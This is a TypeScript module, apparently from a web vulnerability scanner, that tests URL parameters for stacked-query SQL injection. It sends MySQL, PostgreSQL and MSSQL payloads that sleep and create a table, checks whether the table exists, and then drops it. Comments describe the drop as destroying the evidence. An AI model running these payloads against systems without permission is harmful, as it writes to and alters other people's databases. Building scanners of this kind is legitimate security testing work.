import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import { URL } from 'url';
import crypto from 'crypto';

// استيراد الدوال المساعدة والثوابت من الملف المشترك
import { executeRequest, recordVulnerability, COMMON_FALLBACK_PARAMS, delay } from './common';

/**
 * المنفذ (The Executor): خبير تنفيذ الأوامر عبر الاستعلامات المكدسة.
 * يثبت السيطرة الكاملة عن طريق إنشاء جداول والتحقق من وجودها، ثم تنظيف الأثر.
 */
export async function executeStackedQueriesAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('\n[Vector 5] Starting Stacked Queries (Command Execution) Attack...');
    let found = false;

    const TIME_DELAY_THRESHOLD = 4500; // عتبة 4.5 ثوانٍ للكشف الزمني الدقيق

    // دالة لتوليد حمولات تنفيذ الأوامر مع اسم جدول فريد
    const generatePayloads = (tableName: string) => ({
        // ندمج التأخير الزمني (5 ثوانٍ) مع أمر إنشاء جدول (فرصتان للكشف)
        MySQL: `'; SELECT SLEEP(5); CREATE TABLE ${tableName}(data VARCHAR(255)); --`,
        PostgreSQL: `'; SELECT pg_sleep(5); CREATE TABLE ${tableName}(data TEXT); --`,
        MSSQL: `'; WAITFOR DELAY '0:0:5'; CREATE TABLE ${tableName}(data NVARCHAR(255)); --`,
    });

    for (const param of COMMON_FALLBACK_PARAMS) {
        console.log(`\n[Vector 5] Testing Parameter: [${param}]`);

        // توليد اسم جدول فريد لكل محاولة لتجنب التضارب والنتائج الخاطئة
        const uniqueTableName = `ds_proof_${crypto.randomBytes(6).toString('hex')}`;
        const payloads = generatePayloads(uniqueTableName);

        for (const [dbType, executionPayload] of Object.entries(payloads)) {
            console.log(`[Vector 5]   - Attempting with ${dbType} payload...`);
            let detectionMethod = '';

            try {
                // --- Phase 1: The Execution (محاولة تنفيذ الأمر) ---
                const injectionUrl = new URL(targetUrl);
                injectionUrl.searchParams.set(param, executionPayload);

                // قياس وقت الاستجابة الأساسي لطلب نظيف
                const baselineUrl = new URL(targetUrl);
                if (!baselineUrl.searchParams.has(param)) {
                    baselineUrl.searchParams.set(param, '1');
                }
                const { responseTime: baselineTime } = await executeRequest(baselineUrl.toString());

                // حقن الحمولة وقياس الوقت
                const { responseTime: injectionTime } = await executeRequest(injectionUrl.toString());
                console.log(`[Vector 5]     Baseline: ${baselineTime.toFixed(0)}ms, Injection: ${injectionTime.toFixed(0)}ms`);

                // --- Check 1: الكشف عبر التأخير الزمني ---
                if (injectionTime > baselineTime + TIME_DELAY_THRESHOLD) {
                    console.log(`[Vector 5] ✅ Time-based detection successful for ${dbType}.`);
                    detectionMethod = 'Time-Based Delay';
                    found = true;
                }

                // --- Phase 2: The Verification (البحث عن الدليل القاطع) ---
                // نتحقق من وجود الجدول حتى لو نجح الكشف الزمني، لتقديم دليل أقوى.
                const verificationPayload = `' OR 1 IN (SELECT 1 FROM ${uniqueTableName}) --`;
                const verificationUrl = new URL(targetUrl);
                verificationUrl.searchParams.set(param, verificationPayload);

                // إذا نجح هذا الطلب (200 OK)، فهذا يعني أن الجدول موجود!
                const { response: verificationResponse } = await executeRequest(verificationUrl.toString());
                if (verificationResponse.status === 200) {
                    console.log(`[Vector 5] ✅ Verification successful! Table '${uniqueTableName}' exists.`);
                    // نعطي الأولوية لدليل التحقق لأنه أقوى
                    detectionMethod = 'Table Creation Verification';
                    found = true;
                }

                // --- إذا تم تأكيد الثغرة بأي من الطريقتين ---
                if (found) {
                    const proof = `Detection Method: ${detectionMethod}\nDB Type: ${dbType}\nTable Created & Dropped: ${uniqueTableName}\nPayload Used: ${executionPayload}`;
                    const description = `Stacked Query SQLi confirmed in parameter '${param}'. The scanner successfully executed a command (${detectionMethod}), proving arbitrary command execution capability.`;
                    await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);

                    // --- Phase 3: The Cleanup (تدمير الأدلة) ---
                    console.log(`[Vector 5]     Cleaning up... Dropping table ${uniqueTableName}.`);
                    const cleanupPayload = `'; DROP TABLE ${uniqueTableName}; --`;
                    const cleanupUrl = new URL(targetUrl);
                    cleanupUrl.searchParams.set(param, cleanupPayload);
                    // نطلق أمر التنظيف ولا نهتم بالنتيجة
                    executeRequest(cleanupUrl.toString()).catch(() => { /* Ignored */ });

                    break; // أوقف اختبار قواعد البيانات الأخرى لهذا المعلمة
                }

            } catch (error: unknown) {
                // نتجاهل الأخطاء المتوقعة (مثل timeout أو table not found)
                if (error instanceof Error && !error.message.match(/timeout|exist|denied/i)) {
                    console.log(`[Vector 5] ⚠️  Info: An error occurred during the ${dbType} test: ${error.message}`);
                }
            }
        } // نهاية حلقة قواعد البيانات

        if (found) {
            break; // أوقف اختبار بقية المعلمات بعد أول نجاح
        }
    } // نهاية حلقة المعلمات

    if (!found) {
        console.log('[Vector 5] No Stacked Query vulnerabilities were detected.');
    }
    return found;
}
